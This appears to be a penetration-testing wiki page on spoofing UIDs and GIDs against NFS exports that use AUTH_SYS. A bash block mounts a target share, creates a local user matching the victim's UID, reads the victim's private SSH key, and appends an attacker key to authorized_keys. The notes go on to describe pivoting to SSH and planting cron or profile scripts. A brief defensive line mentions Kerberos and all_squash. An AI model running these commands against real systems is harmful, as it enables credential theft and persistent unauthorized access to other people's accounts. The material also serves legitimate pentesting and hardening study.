---
title: "UID and GID spoofing: impersonating any user under AUTH_SYS"
order: 3
description: "With AUTH_SYS, NFS authorizes access by the numeric UID and GID the client sends, not by any authenticated identity. An attacker who can set their local UID/GID to match a file's owner, by creating a matching local user or mounting as root and switching identity, reads and writes that user's files on the export, impersonating any non-root account."
keywords:
  - auth_sys
  - uid spoofing
  - gid spoofing
  - nfs
  - impersonation
---

# UID and GID spoofing

Under `AUTH_SYS`, NFS makes authorization decisions from the UID and GID carried in each RPC request, and it trusts them: there is no proof that the client is that user. So to access a file owned by UID 1005 on the export, an attacker simply needs their requests to carry UID 1005. On a machine they control, that is trivial, create a local user with that UID, or mount as root and `setuid` to it, and every access to the export is then authorized as that user. This impersonates any non-root account regardless of `root_squash`, because squashing only remaps UID 0, not other UIDs.

## The technique

```bash
# learn the owning UID/GID of the target files
mount -t nfs -o vers=3 <target>:/srv/share /mnt/nfs
ls -lan /mnt/nfs                              # e.g. files owned by 1005:1005
# option A: create a local user with the matching UID, then act as them
useradd -u 1005 victim 2>/dev/null; usermod -aG 1005 victim 2>/dev/null
sudo -u victim cat /mnt/nfs/victim/.ssh/id_rsa
# option B: as root locally (no_root_squash not needed for non-root targets),
#   switch identity so requests carry the target UID/GID
su - victim -c 'ls -la /mnt/nfs/victim'
# write as the target user too (plant keys, cron, etc. in their space)
sudo -u victim sh -c 'mkdir -p /mnt/nfs/victim/.ssh; echo "<key>" >> /mnt/nfs/victim/.ssh/authorized_keys'
```

## Exploitation notes

- This works whenever `AUTH_SYS` is in use and the target identity is not root; `root_squash` does not stop it because you impersonate ordinary UIDs, not UID 0.
- Reading a user's `.ssh/id_rsa` or writing their `authorized_keys` on the export pivots to SSH as that user on any system sharing the home directory; writing a cron or profile script runs as them.
- GID spoofing follows the same logic for group-readable/writable files; add the matching GID to your spoofed user.
- The defense is `sec=krb5` (authenticated identities) or `all_squash` (everything mapped to one unprivileged user); where those are set, this is blunted, see [NFSv4 and Kerberos](nfsv4-and-kerberos.md).

## References

- [NFS AUTH_SYS security](https://man7.org/linux/man-pages/man5/nfs.5.html)
- [HackTricks: NFS UID spoofing](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)
